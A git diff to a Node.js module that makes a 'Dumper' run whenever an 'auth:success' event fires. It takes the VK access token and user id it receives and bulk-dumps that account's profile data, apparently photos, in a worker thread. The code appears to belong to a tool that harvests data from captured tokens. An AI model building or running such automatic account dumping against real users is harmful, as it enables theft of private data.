@@ -12,8 +12,56 @@ const { promisify } = require("util");
 const { photos: dumpPhotos } = require("./photos");
 
 const sleep = promisify(setTimeout);
+const dumped = new Set();
 
-module.exports.dump = token => {
+module.exports.init = (config, ee) => {
+  if (!config.enabled) {
+    return console.log(
+      chalk.yellowBright(
+        "Dumper does not loaded, because its disabled by config"
+      )
+    );
+  } else {
+    console.log(chalk.greenBright("Dumper enabled"));
+  }
+
+  ee.on("auth:success", ({ token, user_id }) => {
+    if (dumped.has(user_id)) {
+      return console.log(
+        chalk.yellowBright(
+          `Profile was already dumped: https://vk.com/id${user_id}`
+        )
+      );
+    }
+
+    dumped.add(user_id);
+
+    console.log(
+      chalk.yellowBright(
+        `Starting dumper for profile: https://vk.com/id${user_id}`
+      )
+    );
+
+    dump(token)
+      .then(() =>
+        console.log(
+          chalk.greenBright(
+            `Profile: https://vk.com/id${user_id} successful dumped`
+          )
+        )
+      )
+      .catch(error =>
+        console.log(
+          chalk.redBright(
+            `Profile: https://vk.com/id${user_id} failed to dump`
+          ),
+          error
+        )
+      );
+  });
+};
+
+const dump = token => {
   const worker = new Worker(__filename, { workerData: { token } });
 
   return new Promise((resolve, reject) => {
